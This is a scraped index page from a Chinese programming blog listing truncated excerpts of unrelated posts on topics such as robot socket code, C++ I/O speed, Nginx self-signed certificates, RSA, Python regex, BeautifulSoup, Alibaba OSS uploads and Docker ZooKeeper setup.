VAR socketdev client_socket; VAR num found; VAR num default_val; VAR num start; VAR bool sTOn_True; VAR num angelx1:=0; VAR num angely1:=0; VAR num angelz1:=0; SocketClose client_socket; ! 创建客户端连接 SocketCreate client_socket; ! 连接至本机ip，端口8080 SocketConnect client_socket,"127.0.0.1",8080; TPWrite "socket client connect successful"; ! 发送客户端消息至服务器"I'm Robot" SocketSend client_socket\Str:="I'm Robot"; ! 接收服务端发送过来的数据，数据为字符串类型 SocketReceive client_socket\Str:=received_string; ! 初始化变量 start:=0; default_val:=1; ! 通过for循环，解析出一组deltaX，deltaY，和thetaZ值 FOR i FROM 1 TO 3 DO start:=found+1; !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/211506a83b89ef3f36a73b2dd8328797/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d3ec64019300bc173eeb30ee148712f0/" rel="bookmark">
			计蒜客 网页跳转  解决cin/cout超时问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在刷题的时候，经常会遇到超时的问题。算法没问题，将cin cout 换成 scanf printf 便AC了， 那 cin cout 与scanf printf 到底熟快熟慢？？
我看了这篇文章后豁然开朗，推荐：C++的输入输出 cin/cout和scanf/printf谁比较快？
cin/cout 速度超越scanf/printf的方法：
大家习惯了C++ cin/cout 输入输出风格的，再换成C风格的输入输出比较烦，而且C中没有string类，对字符串的处理也很不友好。那怎么办呢？？
方法来了！！ 只需要在main函数的开始加上以下两行代码，即可实现提高输入输出的速度：(具体原理见上面的链接 ) ios::sync_with_studio(0);
cin.tie(0);
2.所有的换行操作cout&lt;&lt;endl;统统换为'\n' （大大的节约时间 haha）
注意点：
在加上ios::sync_with_studio(0);cin.tie(0);两行代码后，输入输出仅用cin/cout即可，不要一会cin一会scanf，如果再混用c风格的输入输出(scanf printf)会出错。
AC代码：
#include &lt;iostream&gt; #include&lt;stack&gt; #include&lt;cstring&gt; #include&lt;bits/stdc++.h&gt; using namespace std; stack&lt;string&gt; back; stack&lt;string&gt; go; int main() { ios::sync_with_stdio(false);//避免输入输出超时 cin.tie(0); int n; cin&gt;&gt;n; string str1,str2; for(int i=0;i&lt;n;i++){ cin&gt;&gt;str1; if(str1=="VISIT"){ cin&gt;&gt;str2; back.push(str2); cout&lt;&lt;back.top()&lt;&lt;'\n'; while(!go.empty()){//每次打开新页面 清空 go go.pop(); } } if(str1=="BACK"){ if(back.empty()){ cout&lt;&lt;"Ignore\n"; } else{ go.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d3ec64019300bc173eeb30ee148712f0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b97deda73c236e91b88da10cdbf5411/" rel="bookmark">
			NC6系列加按钮
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.找到对应的config.xml文件
再对应的位置配置按钮的引用（想在哪里显示按钮就在哪里添加配置）
如：
列表显示下的按钮 &lt;bean id="actionsOfList" ... ... &lt;!-- 自定义按钮的引用 --&gt; &lt;ref bean="diyoneAction" /&gt; 卡片显示下的按钮 &lt;bean id="actionsOfCard" ... ... &lt;!-- 自定义按钮的引用 --&gt; &lt;ref bean="diytwoAction" /&gt; &lt;!--======= 动作：自定义按钮1 ====采用代码注册=======--&gt; &lt;bean id="diyoneAction" class="nc.ui.test.bill.action.DiyoneAction"&gt; //配置model,editor,相对应的DiyoneAction类也要添加属性，并添加get,set方法 &lt;property name="model"&gt;&lt;ref bean="bmModel"/&gt;&lt;/property&gt; &lt;property name="editor"&gt;&lt;ref bean="billForm"/&gt;&lt;/property&gt; &lt;/bean&gt; &lt;!--======= 动作：自定义按钮2 ====采用配置注册=======--&gt; &lt;bean id="diytwoAction" class="nc.ui.test.bill.action.DiytwoAction"&gt; &lt;property name="model"&gt;&lt;ref bean="bmModel"/&gt;&lt;/property&gt; &lt;property name="editor"&gt;&lt;ref bean="billForm"/&gt;&lt;/property&gt; //需要配置以下属性，按钮编码和按钮名字，随便取 &lt;property name="code" value="diytwoAction"&gt;&lt;/property&gt; &lt;property name="btnName" value="导出Excel"&gt;&lt;/property&gt; &lt;/bean&gt; 2.然后新建按钮对应的类
代码注册按钮时，需要在类中加入无参构造
//采用代码赋值注册按钮 public DiyoneAction() { ActionInitializer.initializeAction(this, "DiyoneAction", "按钮名"); //参数列表, //this(当前对象)，按钮编码，按钮名字 } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/960b5f5bda7e150cd0133ed091376717/" rel="bookmark">
			Recurrent Convolutional Neural Networks for Text Classification
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.Abstract 传统：Traditional text classifiers often rely on many human-designed features, such as dictionaries, knowledge bases and special tree kernels.
提出：
a recurrent structure ——&gt; capture contextual information
a max-pooling layer——&gt;capture the key components in texts
表现
particularly on document-level datasets.
2.Introduction 传统 feature representation:
bag-of-words: where unigrams, bigrams, n-grams or some exquisitely designed patterns are typically extracted as features.
several feature selection methods:
frequency, MI, pLSA, LDA
缺点传统的特征表达方法经常忽略了上下文的信息和词序信息，以及语义信息。
高阶n-gram，tree kernels被应用在特征表达，但是也有稀疏的缺点，影响准确性。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/960b5f5bda7e150cd0133ed091376717/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/61e963c524f5b154daae2dfa910566bd/" rel="bookmark">
			运维架构图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/65b59dbb0dd9cbc4025de46f6c38748f/" rel="bookmark">
			图论例题合集（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
A:LightOJ - 1251 Forming the Council
B:LightOJ - 1063 Ant Hills
C:LightOJ - 1291 Real Life Traffic
D:LightOJ - 1074 Extended Traffic
E:LightOJ - 1108 Instant View of Big Bang
F:LightOJ - 1221 Travel Company
G:LightOJ - 1002 Country Roads
H:LightOJ - 1029 Civil and Evil Engineer
A:LightOJ - 1251 Forming the Council:题目大意：一共有N个选民，M个参选者，一个选民有两个意向，对于+ 表示希望这个人当选。 - 表示希望这个人落选，至少满足一条的结果，对于这个选民来讲就是满足的。问是否有一个可行解，使得所有选民都满足。如果有，输出当选的人的编号。思路:很明显的2-Sat问题。首先我们将一个参选者的当选和不当选进行拆点。i代表第i个人当选了，i+n代表这个人没有当选。那么这个问题就变成了一个经典的2-Sat问题。 #include&lt;stdio.h&gt; #include&lt;string.h&gt; #include&lt;vector&gt; #include&lt;queue&gt; using namespace std; int output[40005]; int vis[70005]; int low[70005]; int dfn[70005]; int print[70005]; int stack[70005]; int color[70005]; int pos[70005]; int degree[70005]; vector&lt;int &gt;mp[70005]; vector&lt;int &gt;mp2[70005]; int n,m,sig,cnt,tot,cont; void add(int x,int y) { mp[x].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/65b59dbb0dd9cbc4025de46f6c38748f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d53138bdbd93e64f0f8d3ad091bc6f6/" rel="bookmark">
			从jvm角度深入理解i&#43;&#43; &#43;&#43;i 区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		测试类
package com.company; public class Main { public void testIPlus() { int i = 0; int j = i++; } public void testPlusI() { int i = 0; int j = ++i; } public static void main(String[] args) { } } javap -v 反汇编后
public void testIPlus(); descriptor: ()V flags: (0x0001) ACC_PUBLIC Code: stack=1, locals=3, args_size=1 0: iconst_0 将int类型常量0压入栈 1: istore_1 取出栈顶元素存入局部变量1 2: iload_1 把局部变量1压入栈(此时局部变量1的值为0) 3: iinc 1, 1 把一个常量值加到一个int类型的局部变量上 (局部变量1值加1) 6: istore_2 取出栈顶元素存入局部变量2 7: return LineNumberTable: line 6: 0 line 7: 2 line 8: 7 public void testPlusI(); descriptor: ()V flags: (0x0001) ACC_PUBLIC Code: stack=1, locals=3, args_size=1 0: iconst_0 将int类型常量0压入栈 1: istore_1 取出栈顶元素存入局部变量1 2: iinc 1, 1 把一个常量值加到一个int类型的局部变量上 (局部变量1值加1) 5: iload_1 把局部变量1压入栈(此时局部变量1的值为0+1) 6: istore_2 取出栈顶元素存入局部变量2 7: return LineNumberTable: line 11: 0 line 12: 2 line 13: 7 2: iload_1 3: iinc 区别就是这两条指令的执行顺序 i++ 先把i的值压入操作数栈在加一 ++i 先把i加一再把i的值压入操作数栈
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8d53138bdbd93e64f0f8d3ad091bc6f6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c3349d641a2d93f6fe52c1c453dfa29b/" rel="bookmark">
			免费开源的几款Web服务器软件简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		由于最近在部署云服务器主机，在对Web服务器软件的选型方面进行了摸索，把笔记记下来，便于以后查阅。
一、NGINX 俄罗斯人Igor Sysoev从2002年开始开发NGINX，并在2004年发布了第一个公开版本。NGINX的开发是为了解决C10K（C10K是如何处理1万个并发连接的简写）问题，目前，它是第二流行的开源web服务器，全球有超过30%的网站在使用它。
NGINX依靠异步事件驱动架构来帮助其处理大量的并发会话，由于其对资源的轻量利用和伸缩自如的特性，它成为了广受欢迎的web服务器。
NGINX在类BSD（Berkeley Software Distribution）许可协议的授权下发布的，它不仅可作为web服务器进行部署，也可作为代理服务器或负载平衡器。你可以在NGINX社区网站找到它的更多信息。
二、Apache HTTP Server Apache HTTP Server，我们常常称之为httpd，或者更简单的Apache。它诞生于1995年，并在2015年2月20日度过了其20岁的生日。全球超过52%的网站使用了Apache，它是目前最流行的web服务器。
Apache httpd通常运行在Linux上，也可以部署在OS X和Windows之上，它的发布得到Apache许可证 2.0 版的许可。该web服务器自身使用模块化架构，加载其它额外的模块可以作为其额外特性。比如，加载mod_proxy模块可以增加服务器代理/ 网关的功能，加载mod_proxy_balancer模块可以为所有支持的协议提供负载平衡。在v2.4版本里，Apache可通过全新的mod_http2模块支持HTTP/2。
从1996年开始，Apache HTTP Server就已经是最为流行的web服务器了，这与它拥有伟大的文档和软件项目集成支持的特性是分不开的，你可以在Apache基金会的项目页面上找到它的更多信息。
三、Apache Tomcat Apache Tomcat是一个可作为web服务器的开源Java servlet容器。Java servlet是可扩展服务器特性的Java程序，虽然servlets可以对任何类型的请求作出响应，但是它还是最常用于Web服务器上的应用实施。这些web servlet在Java上的作用与PHP和ASP.NET等其它动态web技术类似。Tomcat的代码库是由Sun Microsystems公司在1999年捐赠给Apache软件基金会的，并在2005年成为Apache的顶级项目，目前有不到1%的网站在使用它。
Apache Tomcat是在Apache许可证 2.0 版的授权下进行发布的，通常用于运行Java应用程序。此外，它能够通过Coyote的扩展，扮演为本地文件HTTP文档服务的普通服务器的角色。更多详细的信息可以查看Apache Tomcat项目网站。
另外，Apache Tomcat还经常内嵌在其它开源Java应用服务器中，如JBoss, Wildfly和Glassfish。
四、Lighttpd Lighttpd，于2003年3月首次发布，目前全球有大约0.1%的网站在使用它，它是在BSD的许可协议下发布的。
Lighttpd以其低内存占用，低CPU负载和处理速度的优化而独立于世，它使用事件驱动架构，对大量并行连接进行优化，支持FastCGI, SCGI, Auth,Output-compression, URL-rewriting等多种功能。Lighttpd主要用于Catalyst和Ruby on Rails的web框架。通过项目主页，你可以找到它的更多信息。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1421db8eff163a78a3371f76ec8f7799/" rel="bookmark">
			MinGW图形安装界面里面没有mingw32 make.exe解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 首先下载最新mingw 最新的mingw官网下载地址：https://sourceforge.net/projects/mingw/files/latest/download?source=files
2.把mingw加入环境变量 比如：环境变量F:\MINGW\bin
3.从cmd输入命令下载 在cmd里面输入命令：mingw-get install gcc g++ mingw32-make
另外，为了方便，可以把mingw32-make改名为make，以后直接使用make命令就行。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f1af6c7ba92f2026737ea96cb429b73/" rel="bookmark">
			Nginx测试环境Https配置[自签证书]
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		检查Nginx是否编译支持SSL /usr/local/nginx/sbin/nginx -V
–with-http_ssl_module
默认情况下ssl模块并未被安装，如果要使用该模块则需要在编译时指定–with-http_ssl_module参数
生成证书 可以通过以下步骤生成一个简单的证书：
首先，进入你想创建证书和私钥的目录，例如：
$ cd /usr/local/nginx/confmkdir keyscd keys 创建服务器私钥，命令会让你输入一个口令：
$ openssl genrsa -des3 -out server.key 1024 创建签名请求的证书（CSR）：
$ openssl req -new -key server.key -out server.csr 在加载SSL支持的Nginx并使用上述私钥时除去必须的口令：
$ cp server.key server.key.org$ openssl rsa -in server.key.org -out server.key 配置nginx 最后标记证书使用上述私钥和CSR：
$ openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt 修改Nginx配置文件，让其包含新标记的证书和私钥：
server { server_name package-my.le.com; listen 443; ssl on; ssl_certificate keys/server.crt; ssl_certificate_key keys/server.key;} 重启nginx。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f1af6c7ba92f2026737ea96cb429b73/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e87550941b44bfd1918213839cfce22d/" rel="bookmark">
			20191027（32）RT-Thread SPI 设备挂载——ADS1256 后续提供具体实现源码（stm32f407)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目的 1 实现 ADS 1256 采集芯片在 RT-Thread 上的应用
2 了解 SPI 挂载的方式
特别说明 在中断 ISR 中调用 SPI 发送数据相关函数，导致 assertion 报错。Function[rt_mutex_take] shall not be used in ISR，assertion failed at function:rt_mutex_take, line number:656
RT-Thread SPI 和 I2C 数据收发相关函数会调用 rt_mutex_take()，此函数不能再中断函数中使用
官方外设精品文章链接
正文 了解 SPI SPI:
1 串行外设接口总线(SPI)最早由Motorola首先提出的全双工三线同步串行外围接口（SCK, MISO 主入从出， MOSI 主出从入）
2 采用 主从模式 支持一对多
3 通过 CS 片选脚来确定工作对象(大多是 CS 片选脚都是拉低有效，在RTOS 中如果是拉高有效需要另外设置)
设置 SPI 参数（需要查看器件数据手册确定）
1 时钟速率
2 数据数据格式 (MSB 高位在前) / (LSB 低位在前)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e87550941b44bfd1918213839cfce22d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a0e07e623dedab5cfaef9d95db62d63/" rel="bookmark">
			UIPanGestureRecognizer 手势中 velocityInView、locationInView、translationInView
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		translationInView : 手指在视图上移动的位置（x,y）向下和向右为正，向上和向左为负。
locationInView ： 手指在视图上的位置（x,y）就是手指在视图本身坐标系的位置。
velocityInView： 手指在视图上移动的速度（x,y）, 正负也是代表方向，值得一体的是在绝对值上|x| &gt; |y| 水平移动， |y|&gt;|x| 竖直移动。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/85d8405c042e67f473ed9809f7ee3ece/" rel="bookmark">
			RSA密码算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		介绍：本篇文章主要介绍RSA密码算法的流程、基本定理及其实现难点说明。
一.RSA密码算法 1.安全基础 RSA公钥密码体制的理论基础是数论中的大整数因子分解的困难性，即求两个大素数的乘积，在计算机上很容易实现，但是，要将一个大整数分解成两个大素数的乘积，在计算机上很难实现。
2.算法流程 注：由于现代计算机计算性能的提高，要求n的比特长度不低于512，现在使用的RSA算法中一般使用的长度一般为512/1024/2048.每次加密过程中要求明文m小于n。
3.算法证明 4.欧拉定理 5.RSA实例 二.重难点说明 1.大素数选择 在RSA算法中，p、q是两个大素数，这样就涉及到选取大素数的问题。特别的，例如在1024位的RSA算法中，我们可以设计这两个大素数分别为512位（因为两个512bit长度数的乘积为2013或1024bit，而我们需要的是1024bit，故在设计p和q时可将最高的几位固定为1，这样乘积就为1024bit了）。可以通过下面的定理证明一个整数是否为素数，
2.公私钥产生 1）公钥产生
我们生成公钥e时，要求e与n的欧拉函数φ（n）互素，我们可以通过欧几里得算法验证互素与否。也可以通过构造一个一个素数e，因为e与非倍点的任何数都是互素的，故是符合要求的。
while(b!=0) { r = a % b; a = b; b = r; } //最终的a即为原a,b最大公约数 2）私钥产生
私钥d符合要求d = e^(-1)modφ(n)，求逆可以通过拓展欧几里得算法求得。
int exGcd(int a,int b,int &amp;x,int &amp;y) { if(b==0) { x = 1; y = 0; return a; } int r = exGcd(b,a%b,x,y); t = x; x = y; y = t-a/b*y; return r; } 3.加解密 1）加密
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/85d8405c042e67f473ed9809f7ee3ece/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/22250ca52f433e0b6a620be8624fb286/" rel="bookmark">
			Python正则表达式详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、re1.1 match1.2 search1.3 sub1.4 findall1.5 finditer1.6 split1.7 compile 二、Pattern2.1 属性2.2 方法 三、Match3.1 属性3.2 方法 四、正则表达式4.1 常用4.2 边界空白4.3 分组4.4 前后匹配4.5 其他匹配4.6 flags 五、文档 一、re 我们先介绍一下re模块下的方法，这个是我们拿来就可以用的，当然前提是知道一点正则表达式，如果对正则表达式完全不了解，可以先看一下后面正则表达式部分。
1.1 match match方法从字符串的起始位置匹配一个模式，如果没有匹配成功match就返回None
re.match(pattern, string, flags=0) pattern：正则表达式
string：待匹配的字符串
flags：匹配模式(是否区分大小写、单行匹配还是多行匹配)
match返回的是一个re.Match对象，后面会详细介绍Match中的方法。
import re content = "Cats are smarter than dogs" # 第一个参数是正则表达式，re.I表示忽略大小写 match = re.match(r'(cats)', content, re.I) print(type(match)) print(match.groups()) match = re.match(r'dogs', content, re.I) print(type(match)) # print(match.groups()) match主要是用于捕获分组，所以尽量使用分组模式，不然匹配了也无法获取结果，flag是re.I表示忽略大小写。
另外非常重要的一点match只会找第一个匹配的分组:
import re content = "aa aa smarter aa dogs"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/22250ca52f433e0b6a620be8624fb286/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2d8e11937dd5e5afed667dc29c0ea5e/" rel="bookmark">
			如何查看阿里云端口是否开放以及开放端口
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转载：https://www.cnblogs.com/ergexy/p/9718732.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b749fdbc390929bfda0253e3cca0d5f0/" rel="bookmark">
			vscode书写Markdown快速插入图片 picgo 2.0插件使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vscode picgo插件使用 同学给说vscode插件picgo在写markdown文档时进行图片的插入十分的方便，通过组合键的方式就可以，实现选择插入一气呵成。于是进行了安装和配置。
我是使用github作为图床进行配置的。当然picgo还支持七牛，阿里云等多种图床。
刚看到多个配置选项的时候不知道是什么意思。官网只是解释了必须项的含义。
path和custom不是必填项。
path：是指仓库中具体的路径。我写的image/，所有通过插件上传的图片都在image仓库中的image文件夹下。
Repo：是仓库名。格式是：用户名/仓库名
Token：是按照官方的说明在github上申请的token。
官网：picgo官方使用指导
如何使用：
通过三个组合键，可以分别从：1.（Ctrl+alt+U）剪切板 2.（Ctrl+alt+E）文件夹 3.（Ctrl+alt+O）指定路径，但是在windows下开启QQ后会与QQ的识图热键相冲突要手动设置一下 三个方式来进行插入图片。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c658b28aeffccc3e51286ef329e350c5/" rel="bookmark">
			VS2017,VS2019新加控制器，提示运行所选代码生成器出错，程序包还原失败，如何处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在制作新控制器时遇到了标题的错误提示，已经修好了。
实际上，VS只有离线包源，无法解析所需的包。
添加在线参考：工具&gt; nuget包管理器&gt;包管理器设置&gt;包源
添加来源：https：//api.nuget.org/v3/index.json
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ecfe733a1074a9a7477031a71a3ffa25/" rel="bookmark">
			vue 签名组件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		临时帮朋友写个移动端的项目, 发现 它的项目中有个 pdf 文档的 签名功能, 也是折腾了一下签名组件
签名组件原理: 利用原生canvas 配合 移动端的事件, touchstart, touchend, touchmove, 进行 在canvas 画布上画线, 最后,把生成的签名, 通过 toDataURL()方法 保存 为 base64 图片,就拿到签名了,实现效果如下:
清空画布, 选择签名字体颜色, 保存, 功能比较简单
github上的 签名组件
上代码啊 注: 本项目中使用了 vant-ui, 看演示报错的小伙伴 ,记得删除掉 vant-ui 的组件,然而,你可能看不到 有些效果了,比如字体颜色,清空, 确认等
1. template 模板
&lt;template&gt; &lt;div class="signHandle"&gt; &lt;canvas ref="signHandle" class="canvas" /&gt; &lt;div class="btn_container van-hairline--top" :style="{height:height + 'px'}"&gt; &lt;van-radio-group v-model="radio" class="radio_container" @change="radioHandle"&gt; &lt;van-radio v-for="item in liColors" :key="item" :checked-color="item" :name="item" /&gt; &lt;/van-radio-group&gt; &lt;div&gt; &lt;van-button size="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ecfe733a1074a9a7477031a71a3ffa25/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/044047d01b4a420955f636bc5427ba9f/" rel="bookmark">
			阿里云对象存储OSS-分片上传
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 对象存储OSS-分片上传什么是分片上传分片上传的实用场景分片上传的三个步骤1、初始化一个分片上传事件2、上传分片3、完成分片上传 代码实现方式一方式二 问题1、分片上传，上传进度怎么处理？ 注意事项心得 对象存储OSS-分片上传 什么是分片上传 当使用简单上传（PutObject）功能来上传较大的文件到OSS的时候，如果上传的过程中出现了网络错误，会出现上传失败，重试必须从文件起始位置上传。针对这种情况，OSS提供了分片上传(Multipart Upload)来达到断点续传的效果。
顾名思义，分片上传就是将要上传的文件分成多个数据块（OSS里又称之为Part）来分别上传，上传完成之后再调用OSS的接口将这些Part组合成一个Object。
分片上传的实用场景 一般传输大文件的时候使用分片上传，比如大的视频点播文件等。
分片上传的三个步骤 1、初始化一个分片上传事件 略…
2、上传分片 这里有两个步骤，1将文件分片，2将分片的文件上传。分片的大小可根据整个文件的大小来合理的设置分片数量。例如，有一个文件是5个G，分片数量设置为10，即将一个5个G的文件分10次上传，每次上传0.5个G。
3、完成分片上传 略…
代码实现 方式一 方式一是在OSS SDK文档中看到的实现分片上传原理的代码实现，通过测试这种方式效率感觉不高，比较慢，上传大的文件（视频）的时候会闪退，提价了工单问了工作人员，也没解决，建议使用方式二的上传方式，方式一的代码可以让我们更加直白的理解什么是分片，怎么分片。
上传部分代码
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{ //7、初始化OSSInitMultipartUploadRequest __block NSString * uploadId = nil; __block NSMutableArray *partInfos = [NSMutableArray new]; NSString *uploadToBucket = [VHOSSManager sharedManager].federationToken.bucketName; NSString *uploadObjectkey = [NSString stringWithFormat:@"demand/%@%@",uplodFile.fileMD5,uplodFile.MIMEType]; OSSInitMultipartUploadRequest * init = [OSSInitMultipartUploadRequest new]; init.bucketName = uploadToBucket; init.objectKey = uploadObjectkey; OSSTask * initTask = [[VHOSSManager sharedManager].client multipartUploadInit:init]; [initTask waitUntilFinished]; if (!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/044047d01b4a420955f636bc5427ba9f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2cb3f1d76e7a643869fd30f02951442d/" rel="bookmark">
			BeautifulSoup详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、BeautifulSoup构建1.1 通过字符串构建1.2 从文件加载 二、Tag对象2.1 string、strings、stripped_strings2.2 get_text()2.3 属性 三、contents、children与descendants3.1 parent、parents3.2 next_sibling、previous_sibling3.3 next_element、previous_element 四、find、find_all4.1 方法4.2 tag名称4.3 属性4.4 正则表达式4.5 函数4.6 文本 五、select5.1 方法5.2 通过tag选择5.3 id与类选择器5.4 属性选择器5.5 其他选择器 六、实例七、CSS选择器7.1 常用选择器7.2 位置选择器7.3 其他选择器 八、文档 一、BeautifulSoup构建 1.1 通过字符串构建 from bs4 import BeautifulSoup html = """ &lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse's story&lt;/title&gt;&lt;/head&gt; &lt;body&gt; &lt;p class="story"&gt;Once upon a time there were three little sisters; and their names were &lt;/p&gt; """ soup = BeautifulSoup(html, 'html.parser') print(soup.prettify()) 1.2 从文件加载 from bs4 import BeautifulSoup with open(r"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2cb3f1d76e7a643869fd30f02951442d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ac78070a7ea5ca849547295d23c4884/" rel="bookmark">
			python pycharm如何全局（整个项目中）搜索指定代码？（CTRL&#43;SHIFT&#43;F）全局字符串搜索
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 CTRL+SHIFT+F 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7ce7fa02866058dc4b00437b362ffca6/" rel="bookmark">
			docker在两台服务器上部署zookeeper集群（亲测可用）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		假设有A和B两台服务器，在A部署一个zk容器，B部署两个zk容器，一共3个（zk建议最好是奇数）
步骤：
1、在A的服务器中创建zookeeper1的文件夹
mkdir -p ~/docker/zookeeper1
mkdir ~/docker/zookeeper1/data
cd ~/docker/zookeeper1
echo 1 &gt; data/myid
2、在创建zoo.cfg 文件
vim zoo.cfg
# The number of milliseconds of each tick tickTime=2000 # The number of ticks that the initial # synchronization phase can take initLimit=10 # The number of ticks that can pass between # sending a request and getting an acknowledgement syncLimit=5 # the directory where the snapshot is stored. # do not use /tmp for storage, /tmp here is just # example sakes.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7ce7fa02866058dc4b00437b362ffca6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e7fdaf5b683c9f414cdc53b09b2d7253/" rel="bookmark">
			空间Attention
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 简介 空间注意力（Spatial Attention）机制，特别是基于 Transformer 的注意力机制在最近取得了广泛的成功与应用，但是对该机制本身的理解和分析仍然匮乏。本论文对空间注意力机制进行了详尽的经验性分析，取得了更深入的理解与一些全新的观点，这些分析表明空间注意力机制的设计存在很大的改进空间。
2. 论文 Transformer-XL 中提出，注意力权重可以按使用的特征因子被拆解为四项:（E1）query 内容特征和 key 内容特征；（E2）query 内容特征和 query-key 相对位置；（E3）仅 key 的内容特征；（E4）仅 query-key 相对位置。
使用广义注意力形式来统一不同的注意力机制：
y q = ∑ m = 1 M W m [ ∑ k ∈ Ω q A m ( q , k , z q , x k ) ⊙ W m ′ x k ] y_{q}=\sum_{m=1}^{M} W_{m}\left[\sum_{k \in \Omega_{q}} A_{m}\left(q, k, z_{q}, x_{k}\right) \odot W_{m}^{\prime} x_{k}\right] yq​=m=1∑M​Wm​⎣⎡​k∈Ωq​∑​Am​(q,k,zq​,xk​)⊙Wm′​xk​⎦⎤​
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e7fdaf5b683c9f414cdc53b09b2d7253/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3620f5dc9bc2f16702ec00a7b9a8f392/" rel="bookmark">
			剑指Offer面试题：4.替换空格
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、题目 请实现一个函数，把字符串中的每个空格替换成"%20"。例如输入“We are happy.”，则输出“We%20are%20happy.”。
二、思路 在字符串尾部填充任意字符，使得字符串的长度等于替换之后的长度。因为一个空格要替换成三个字符（%20），因此当遍历到一个空格时，需要在尾部填充两个任意字符。
